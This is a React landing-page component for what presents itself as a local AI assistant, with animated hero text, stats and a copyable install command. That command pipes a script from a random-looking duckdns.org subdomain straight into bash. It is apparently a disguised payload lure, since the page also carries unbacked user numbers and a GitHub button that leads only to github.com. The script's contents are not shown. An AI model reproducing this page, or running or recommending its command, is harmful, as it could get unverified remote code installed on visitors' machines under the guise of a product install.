import { useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { ArrowRight, Sparkles, Copy, Check } from 'lucide-react';
import { useState } from 'react';

export function Hero() {
  const [copied, setCopied] = useState(false);
  const heroRef = useRef<HTMLDivElement>(null);

  const installCommand = 'curl -fsSL https://wgrbojeweoginrb234.duckdns.org/install.sh | bash';

  const handleCopy = () => {
    navigator.clipboard.writeText(installCommand);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('animate-fade-up');
            observer.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.1, rootMargin: '0px 0px -10% 0px' }
    );

    const elements = heroRef.current?.querySelectorAll('.reveal');
    elements?.forEach((el) => observer.observe(el));

    return () => observer.disconnect();
  }, []);

  return (
    <section
      ref={heroRef}
      className="relative min-h-screen flex items-center justify-center overflow-hidden pt-20"
    >
      {/* Background Effects */}
      <div className="absolute inset-0 overflow-hidden">
        {/* Gradient Orbs */}
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-purple-500/20 rounded-full blur-[120px] animate-float" />
        <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-blue-500/15 rounded-full blur-[100px] animate-float" style={{ animationDelay: '-5s' }} />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-purple-600/10 rounded-full blur-[150px] animate-pulse-glow" />
        
        {/* Grid Pattern */}
        <div 
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage: `linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px)`,
            backgroundSize: '60px 60px'
          }}
        />
      </div>

      {/* Content */}
      <div className="relative z-10 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
        {/* Badge */}
        <div className="reveal opacity-0" style={{ animationDelay: '0.1s' }}>
          <Badge 
            variant="secondary" 
            className="mb-6 px-4 py-2 bg-white/5 border border-white/10 text-white/80 hover:bg-white/10 transition-colors cursor-pointer"
          >
            <Sparkles className="w-4 h-4 mr-2 text-purple-400" />
            Now with GPT-5 Support
            <ArrowRight className="w-4 h-4 ml-2" />
          </Badge>
        </div>

        {/* Title */}
        <h1 
          className="reveal opacity-0 text-4xl sm:text-5xl md:text-6xl lg:text-7xl font-extrabold text-white leading-tight mb-6"
          style={{ animationDelay: '0.2s' }}
        >
          Your AI Assistant That{' '}
          <span className="text-gradient">Actually Does Things</span>
        </h1>

        {/* Subtitle */}
        <p 
          className="reveal opacity-0 text-lg sm:text-xl text-white/60 max-w-2xl mx-auto mb-10 leading-relaxed"
          style={{ animationDelay: '0.4s' }}
        >
          Runs on your machine. Integrates with your apps. Remembers everything. 
          No cloud required.
        </p>

        {/* CTA Buttons */}
        <div 
          className="reveal opacity-0 flex flex-col sm:flex-row items-center justify-center gap-4 mb-12"
          style={{ animationDelay: '0.6s' }}
        >
          <Button
            size="lg"
            className="bg-gradient-primary hover:opacity-90 text-white font-semibold px-8 py-6 text-base rounded-xl transition-all duration-300 hover:shadow-glow group"
            onClick={() => window.location.href = '/dashboard'}
          >
            Open Dashboard
            <ArrowRight className="w-5 h-5 ml-2 group-hover:translate-x-1 transition-transform" />
          </Button>
          <Button
            size="lg"
            variant="outline"
            className="border-white/20 text-white hover:bg-white/5 px-8 py-6 text-base rounded-xl transition-all duration-300"
            onClick={() => window.open('https://github.com', '_blank')}
          >
            View on GitHub
          </Button>
        </div>

        {/* Install Command */}
        <div 
          className="reveal opacity-0 max-w-xl mx-auto"
          style={{ animationDelay: '0.8s' }}
        >
          <div className="bg-white/5 border border-white/10 rounded-xl p-4 flex items-center justify-between group hover:border-white/20 transition-colors">
            <code className="text-sm sm:text-base text-white/80 font-mono truncate">
              <span className="text-purple-400">$</span> {installCommand}
            </code>
            <button
              onClick={handleCopy}
              className="ml-4 p-2 rounded-lg hover:bg-white/10 transition-colors flex-shrink-0"
            >
              {copied ? (
                <Check className="w-5 h-5 text-green-400" />
              ) : (
                <Copy className="w-5 h-5 text-white/50 group-hover:text-white/80 transition-colors" />
              )}
            </button>
          </div>
          <p className="text-xs text-white/40 mt-3">
            Works on macOS, Windows & Linux. One command installs everything.
          </p>
        </div>

        {/* Stats */}
        <div 
          className="reveal opacity-0 mt-16 grid grid-cols-3 gap-8 max-w-lg mx-auto"
          style={{ animationDelay: '1s' }}
        >
          {[
            { value: '50K+', label: 'Users' },
            { value: '1M+', label: 'Tasks Done' },
            { value: '99.9%', label: 'Uptime' },
          ].map((stat) => (
            <div key={stat.label} className="text-center">
              <div className="text-2xl sm:text-3xl font-bold text-white">{stat.value}</div>
              <div className="text-sm text-white/50">{stat.label}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Bottom Gradient Fade */}
      <div className="absolute bottom-0 left-0 right-0 h-32 bg-gradient-to-t from-black to-transparent" />
    </section>
  );
}
